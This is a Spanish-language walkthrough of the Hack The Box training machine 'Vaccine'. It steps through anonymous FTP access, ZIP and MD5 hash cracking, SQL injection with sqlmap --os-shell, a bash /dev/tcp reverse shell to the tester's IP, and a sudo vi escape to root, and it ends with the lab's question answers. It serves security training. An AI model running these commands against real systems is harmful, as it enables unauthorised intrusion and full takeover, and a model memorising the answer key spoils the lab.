---
tags:
- Máquinas y prácticas
---

# Vaccine

**Hack The Box**

**Máquina: Vaccine**

*Starting Point · Linux · Easy*

| Plataforma | Hack The Box – Starting Point |
| --- | --- |
| OS | Linux |
| Dificultad | Easy |
| Técnicas | FTP anónimo · John the Ripper · SQLi · os-shell · PrivEsc vi |
| Objetivo | Obtener user.txt y root.txt |

# **1. Reconocimiento inicial**

El primer paso es identificar qué servicios expone la máquina. Usamos nmap para escanear puertos y versiones.

## **1.1 Escaneo con nmap**

| nmap -sC -sV -oN vaccine.txt 10.129.34.252  # Resultado esperado:  21/tcp open ftp vsftpd 3.0.3  22/tcp open ssh OpenSSH 8.0  80/tcp open http Apache httpd 2.4.41 |
| --- |

| **ℹ️ INFO — Servicios descubiertos**  Puerto 21 → FTP (permite login anónimo)  Puerto 22 → SSH (acceso posterior con credenciales)  Puerto 80 → Servidor web con panel de login |
| --- |

# **2. Acceso FTP anónimo**

El servidor FTP permite autenticación anónima. Nos conectamos y descargamos el archivo disponible.

| ftp 10.129.34.252  # Name: anonymous  # Password: (Enter vacío)  ftp> ls -la  ftp> get backup.zip  ftp> bye |
| --- |

| **⚠️ AVISO — Cliente FTP**  El cliente ftp clásico NO usa flags -u ni -p.  Alternativa más cómoda: lftp -u anonymous, 10.129.34.252  Para descargar directorios enteros con lftp: mirror /ruta ./local |
| --- |

# **3. Cracking del archivo ZIP protegido**

El archivo backup.zip está protegido con contraseña. Usamos zip2john + John the Ripper para crackearla.

## **3.1 ¿Qué es zip2john?**

zip2john es el script incluido en el toolset de John the Ripper que convierte un ZIP protegido en un hash crackeable.

## **3.2 Proceso completo**

| # 1. Generar el hash del ZIP  zip2john backup.zip > hash.txt  # 2. Verificar el hash generado  cat hash.txt  # 3. Crackear con rockyou  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  # 4. Ver contraseña encontrada  john hash.txt --show  # Resultado: backup.zip:741852963  # 5. Descomprimir  unzip backup.zip # contraseña: 741852963 |
| --- |

| **✅ OBJETIVO — Contraseña del ZIP encontrada**  Contraseña: 741852963  Archivos extraídos: index.php, style.css |
| --- |

# **4. Análisis de index.php — Credenciales admin**

El archivo index.php contiene el código del login. Dentro encontramos el hash MD5 de la contraseña del admin.

| cat index.php  # Línea clave:  if($\_POST['username'] === 'admin' &&  md5($\_POST['password']) === '2cb42f8734ea607eefed3b70af13bbd3') |
| --- |

## **4.1 Cracking del hash MD5**

El hash MD5 debe crackearse para obtener la contraseña en texto plano.

| # Opción 1 — John the Ripper  echo '2cb42f8734ea607eefed3b70af13bbd3' > hash\_md5.txt  john hash\_md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5  john hash\_md5.txt --show  # Opción 2 — Hashcat  hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt  # Opción 3 — Online: https://crackstation.net |
| --- |

| **🔴 PELIGRO — Nunca enviar el hash como respuesta**  HTB pide la contraseña en TEXTO PLANO, no el hash MD5.  El hash es: 2cb42f8734ea607eefed3b70af13bbd3  La respuesta correcta es el resultado del cracking. |
| --- |

## **4.2 Comparativa: ftp vs lftp**

| **Característica** | **ftp (clásico)** | **lftp (moderno)** |
| --- | --- | --- |
| Autocompletado Tab | ❌ | ✅ |
| Descargar directorio | ❌ | ✅ mirror |
| Reconexión automática | ❌ | ✅ |
| Soporte FTPS/SFTP/HTTP | ❌ | ✅ |
| Disponible por defecto | ✅ | ❌ (instalar) |

# **5. Explotación — SQL Injection con sqlmap**

Una vez dentro del panel de administración en el puerto 80, encontramos un parámetro vulnerable a inyección SQL.

## **5.1 Obtener cookie de sesión**

| # 1. Loguearse en http://10.129.34.252 con admin:PASSWORD  # 2. Abrir F12 → Application → Cookies  # 3. Copiar el valor de PHPSESSID |
| --- |

## **5.2 Lanzar sqlmap con --os-shell**

La opción --os-shell de sqlmap intenta obtener ejecución de comandos en el sistema operativo a través de la inyección SQL.

| sqlmap -u 'http://10.129.34.252/dashboard.php?search=1' \  --cookie='PHPSESSID=TU\_COOKIE\_AQUI' \  --os-shell |
| --- |

| **🔴 PELIGRO — Respuesta a pregunta de HTB**  What option can be passed to sqlmap to try to get command execution via the SQL injection?  Respuesta: --os-shell |
| --- |

# **6. Reverse Shell — Shell estable**

La os-shell de sqlmap es inestable. Conviene lanzar una reverse shell real para trabajar cómodamente.

## **6.1 Preparar listener en tu máquina**

| nc -lvnp 4444 |
| --- |

## **6.2 Lanzar reverse shell desde os-shell**

| # Desde la os-shell de sqlmap:  bash -c 'bash -i >& /dev/tcp/TU\_IP/4444 0>&1' |
| --- |

## **6.3 Estabilizar la shell**

| python3 -c 'import pty; pty.spawn("/bin/bash")'  export TERM=xterm  # Ctrl+Z  stty raw -echo; fg |
| --- |

| **ℹ️ INFO — ¿Por qué estabilizar la shell?**  Sin estabilizar: no hay Ctrl+C, no hay historial, no hay autocompletado.  Con python3 pty + stty obtenemos una TTY interactiva completa. |
| --- |

# **7. Flag de usuario (user.txt)**

Ya dentro del servidor como el usuario postgres, buscamos el archivo user.txt.

| whoami  # postgres  find / -name user.txt 2>/dev/null  cat /ruta/encontrada/user.txt |
| --- |

# **8. Escalada de privilegios — sudo vi**

El usuario postgres puede ejecutar vi como root sin contraseña. Esto permite escapar a una shell root.

## **8.1 Verificar permisos sudo**

| sudo -l  # Resultado:  User postgres may run the following commands:  (root) NOPASSWD: /bin/vi |
| --- |

## **8.2 Escalar a root con vi**

| # 1. Abrir vi como root  sudo vi  # 2. Dentro de vi, escribir:  :!/bin/bash  # 3. ¡Ya somos root!  whoami  # root |
| --- |

| **🔴 PELIGRO — Respuesta a pregunta de HTB**  ¿Qué programa puede ejecutar el usuario postgres como root usando sudo?  Respuesta: vi  Referencia: GTFOBins → https://gtfobins.github.io/gtfobins/vi/ |
| --- |

| **ℹ️ INFO — ¿Por qué funciona esto?**  vi permite ejecutar comandos de shell con :!comando  Si vi se ejecuta como root (sudo vi), el shell que lanza también es root.  GTFOBins es el recurso de referencia para explotar binarios con sudo/suid. |
| --- |

# **9. Flag de root (root.txt)**

| # Ya como root:  cat /root/root.txt |
| --- |

| **✅ OBJETIVO — Máquina completada**  user.txt → /var/lib/postgresql/user.txt (o similar)  root.txt → /root/root.txt  ¡Vaccine pwned! |
| --- |

# **10. Diagrama de flujo — Resumen del ataque**

| **🔍 RECONOCIMIENTO → nmap -sC -sV 10.129.34.252** |
| --- |
| ▼ |
| **📂 FTP ANÓNIMO → ftp + get backup.zip** |
| ▼ |
| **🔑 CRACK ZIP → zip2john + john --wordlist=rockyou.txt** |
| ▼ |
| **📄 ANÁLISIS index.php → Hash MD5 admin** |
| ▼ |
| **💥 CRACK MD5 → john / hashcat / crackstation.net** |
| ▼ |
| **🌐 LOGIN WEB → admin : PASSWORD** |
| ▼ |
| **💉 SQL INJECTION → sqlmap --os-shell** |
| ▼ |
| **🐚 REVERSE SHELL → nc -lvnp 4444** |
| ▼ |
| **📋 USER FLAG → find / -name user.txt** |
| ▼ |
| **⬆️ PRIVESC → sudo vi → :!/bin/bash** |
| ▼ |
| **👑 ROOT FLAG → cat /root/root.txt** |

# **11. Respuestas a las preguntas de HTB**

| **Pregunta** | **Respuesta** |
| --- | --- |
| Script para generar hash de ZIP en John | zip2john |
| Contraseña del ZIP backup.zip | 741852963 |
| Contraseña del admin en la web | [resultado del crack MD5] |
| Opción sqlmap para command execution | --os-shell |
| Programa que postgres ejecuta como root | vi |

# **12. Recursos útiles**

GTFOBins — Binarios explotables con sudo/SUID:

https://gtfobins.github.io/gtfobins/vi/

CrackStation — Cracking de hashes online:

https://crackstation.net

PayloadsAllTheThings — Reverse shells:

https://github.com/swisskyrepo/PayloadsAllTheThings

HackTricks — Guías de pentesting:

https://book.hacktricks.xyz
